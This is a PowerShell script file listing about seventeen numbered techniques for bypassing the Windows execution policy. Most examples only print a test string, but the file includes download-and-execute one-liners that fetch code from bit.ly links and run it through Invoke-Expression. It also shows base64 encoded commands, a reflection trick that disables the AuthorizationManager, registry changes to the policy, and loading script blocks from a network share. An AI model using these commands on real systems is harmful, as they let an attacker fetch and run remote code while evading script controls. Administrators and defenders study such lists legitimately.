Set-Location $PSScriptRoot

Get-ExecutionPolicy

Get-ExecutionPolicy -List | Format-Table -AutoSize

.\MyScript.ps1

### Bypassing the PowerShell Execution Policy
#############################################################################

#1 Paste the Script into an Interactive PowerShell Console
Write-Host -Message "this is my evil script"


#2 Echo the Script and Pipe it to PowerShell Standard In
Echo "Write-Host 'this is my evil script'"  | PowerShell.exe -noprofile 

#3 Read Script from a File and Pipe to PowerShell Standard In

#Example 1: Get-Content PowerShell command
Get-Content MyScript.ps1 | PowerShell.exe -noprofile 

#Example 2: Type command
TYPE MyScript.ps1 | PowerShell.exe -noprofile

#4 Download Script from URL and Execute with Invoke Expression
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"

iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")

#5 Use the Command Switch
Powershell.exe -nop -command "Write-Host 'this is my evil script'"


#6 Use the EncodeCommand Switch
#Example 1: Full command
$command = "Write-Host 'this is my evil script'" 
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command) 
$encodedCommand = [Convert]::ToBase64String($bytes) 
powershell.exe -EncodedCommand $encodedCommand


#Example 2: Short command using encoded string
powershell.exe -Enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAdABoAGkAcwAgAGkAcwAgAG0AeQAgAGUAdgBpAGwAIABzAGMAcgBpAHAAdAAnAA==

#7 Use the Invoke-Command Command
invoke-command -scriptblock {Write-Host 'this is my evil script'}

#Based on the Obscuresec blog, the command below can also be used to grab the execution policy from a remote computer and apply it to the local computer.
#invoke-command -computername localhost -scriptblock {get-executionpolicy} | set-executionpolicy -force

#Use the Invoke-Expression Command
#Example 1: Full command using Get-Content
Get-Content MyScript.ps1 | Invoke-Expression

#Example 2: Short command using Get-Content
GC MyScript.ps1 | iex

#9 Use the "Bypass" Execution Policy Flag
PowerShell.exe -ExecutionPolicy Bypass -File MyScript.ps1

#10 Use the "Unrestricted" Execution Policy Flag
PowerShell.exe -ExecutionPolicy UnRestricted -File MyScript.ps1

#11 Use the "Remote-Signed" Execution Policy Flag
#First sign your script with a self created cert - makecert.exe
PowerShell.exe -ExecutionPolicy Remote-signed -File .runme.ps1

#12 Disable ExecutionPolicy by Swapping out the AuthorizationManager
function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))} 
Disable-ExecutionPolicy  
.\MyScript.ps1

#13 Set the ExcutionPolicy for the Process Scope
Set-ExecutionPolicy Bypass -Scope Process

#14 Set the ExcutionPolicy for the CurrentUser Scope via Command
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy Unrestricted

#15 Set the ExcutionPolicy for the CurrentUser Scope via the Registry
#Computer\HKEY_CURRENT_USER\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell
#ExecutionPolicy REG_SZ Unrestricted

#16 Create the following ps.cmd and put it in your PATH:
POWERSHELL -Command "$enccmd=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((Get-Content '%1' | Out-String)));POWERSHELL -EncodedCommand $enccmd"

#17 Using a ScriptBlock
$scriptcontents = [scriptblock]::create((get-content '\\server\filepath.ps1'|out-string))
. $scriptcontents

#...
